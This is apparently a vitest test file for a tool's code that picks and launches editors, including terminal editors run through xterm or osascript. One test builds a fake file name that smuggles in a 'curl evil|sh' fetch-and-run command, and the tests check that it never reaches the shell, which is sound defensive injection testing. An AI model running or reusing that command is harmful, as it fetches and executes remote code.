import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { describe, expect, it } from "vitest";
import { chooseEditor, inTerminal, installedEditors, launch, resolveEditor } from "./editor";
import { tempDir, WIN } from "./test-repo";

// On Windows this is VS Code's layout: a script for Git Bash that can't run, beside the .cmd that can.
function binDir(...names: string[]) {
  const dir = tempDir("moire-bin-");
  for (const name of names.flatMap((n) => (WIN ? [n, `${n}.cmd`] : [n]))) {
    writeFileSync(join(dir, name), "#!/bin/sh\n");
    chmodSync(join(dir, name), 0o755);
  }
  return dir;
}

const bin = (dir: string, name: string) => join(dir, WIN ? `${name}.cmd` : name);

describe("resolveEditor", () => {
  it("picks the first known editor on PATH, with its line syntax", () => {
    const dir = binDir("zed", "code");
    expect(resolveEditor(undefined, dir)).toEqual({ exe: bin(dir, "code"), args: ["-g", "{file}:{line}"] });
    expect(resolveEditor(undefined, binDir("idea"))?.args).toEqual(["--line", "{line}", "{file}"]);
  });

  it("uses a saved template, and finds nothing when the editor isn't installed", () => {
    const dir = binDir("zed");
    expect(resolveEditor("zed --new {file}:{line}", dir)).toEqual({ exe: bin(dir, "zed"), args: ["--new", "{file}:{line}"] });
    expect(resolveEditor("nonexistent-editor {file}", dir)).toBeNull();
  });

  it("leaves terminal editors to the picker", () => {
    expect(resolveEditor(undefined, binDir("nvim"))).toBeNull();
  });
});

describe("choosing an editor", () => {
  it("lists what's installed, saying which need a terminal", () => {
    expect(installedEditors(binDir("code", "nvim", "xterm"), "linux").installed).toEqual([
      { name: "code", template: "code -g {file}:{line}", terminal: false },
      { name: "nvim", template: "nvim +{line} {file}", terminal: true },
    ]);
  });

  it("won't offer or accept a terminal editor with no terminal to run it in, or on Windows", () => {
    const dir = binDir("code", "nvim");
    expect(installedEditors(dir, "linux").installed.map((e) => e.name)).toEqual(["code"]);
    expect(installedEditors(dir, "darwin").installed.map((e) => e.name)).toEqual(["code", "nvim"]);
    expect(() => chooseEditor("nvim {file}", dir, "linux")).toThrow("nvim needs a terminal");
    expect(chooseEditor("nvim {file}", dir, "darwin").name).toBe("nvim");
    const withTerminal = binDir("code", "nvim", "xterm");
    expect(installedEditors(withTerminal, "win32").installed.map((e) => e.name)).toEqual(["code"]);
    expect(() => chooseEditor("nvim {file}", withTerminal, "win32")).toThrow("nvim needs a terminal");
  });

  it("adds the file to a bare command and refuses one that isn't installed", () => {
    expect(chooseEditor("  nvim ", binDir("nvim", "xterm"), "linux")).toEqual({ editor: "nvim {file}", name: "nvim" });
    expect(() => chooseEditor("nvim {file}", binDir())).toThrow("Can't find nvim");
  });
});

describe("launch", () => {
  const script = (posix: string, windows: string) => {
    const file = join(tempDir("moire-bin-"), WIN ? "tool.cmd" : "tool");
    writeFileSync(file, WIN ? `@echo off\r\n${windows}\r\n` : `#!/bin/sh\n${posix}\n`);
    chmodSync(file, 0o755);
    return file;
  };

  it("reports a command that fails straight away, or can't start", async () => {
    await expect(launch(script("exit 3", "exit /b 3"), [], tmpdir())).rejects.toThrow("tool exited with code 3");
    await expect(launch("/nonexistent/tool", [], tmpdir())).rejects.toThrow("ENOENT");
  });

  it("doesn't wait for one that keeps running", async () => {
    const start = Date.now();
    await expect(launch(script("sleep 2", "ping -n 3 127.0.0.1 >nul"), [], tmpdir(), 50)).resolves.toBeUndefined();
    expect(Date.now() - start).toBeLessThan(1500);
  });

  it("passes file names through untouched, even to a .cmd that reads them twice", async () => {
    const save = `require('fs').writeFileSync('args.json', JSON.stringify(process.argv.slice(1)))`;
    const tool = script(`node -e "${save}" "$@"`, `node -e "${save}" %*`);
    const args = ["a b&c|d.txt", "%PATH%", "^!x!(y);z,", 'say "hi"', "C:\\dir\\"];
    await launch(tool, args, dirname(tool), 30_000);
    expect(JSON.parse(readFileSync(join(dirname(tool), "args.json"), "utf8"))).toEqual(args);
  });

  it.skipIf(WIN)("waits for osascript however long it takes, and explains a refusal", async () => {
    const dir = binDir("osascript");
    writeFileSync(join(dir, "osascript"), "#!/bin/sh\nsleep 0.2\nexit 1\n");
    await expect(launch(join(dir, "osascript"), [], tmpdir(), 10)).rejects.toThrow("Automation");
  });
});

describe("terminal editors", () => {
  const fakeEditor = () => {
    const dir = binDir("nvim");
    const log = join(dir, "log");
    writeFileSync(join(dir, "nvim"), `#!/bin/sh\npwd > "${log}"\nfor a in "$@"; do printf '[%s]' "$a" >> "${log}"; done\n`);
    return { dir, log, name: `it's "odd"\u0003curl evil|sh\n.txt` };
  };

  it.skipIf(WIN)("runs a script in the first terminal found, with that terminal's flag, which removes itself", () => {
    const { dir, log, name } = fakeEditor();
    const terminals = binDir("xterm", "ptyxis");
    const run = inTerminal(join(dir, "nvim"), [name], dir, "linux", terminals);
    expect(run?.exe).toBe(join(terminals, "ptyxis"));
    expect(run!.args.slice(0, 2)).toEqual(["--", "sh"]);
    expect(run!.args.join(" ")).not.toContain("evil");
    execFileSync("sh", [run!.args[2]], { cwd: tmpdir() });
    expect(readFileSync(log, "utf8")).toBe(`${dir}\n[${name}]`);
    expect(existsSync(dirname(run!.args[2]))).toBe(false);
    expect(inTerminal("/bin/nvim", [], tmpdir(), "linux", binDir())).toBeNull();
  });

  it.skipIf(WIN)("on macOS types only a script's path, which runs the editor in the repo and removes itself", () => {
    const { dir, log, name } = fakeEditor();
    const run = inTerminal(join(dir, "nvim"), [name], dir, "darwin");
    expect(run?.exe).toBe("osascript");
    const script = /do script "sh '(.+)'"$/.exec(run!.args[1])![1];
    expect(run!.args.join(" ")).not.toContain("evil");
    execFileSync("sh", [script], { cwd: tmpdir() });
    expect(readFileSync(log, "utf8")).toBe(`${dir}\n[${name}]`);
    expect(existsSync(dirname(script))).toBe(false);
  });
});
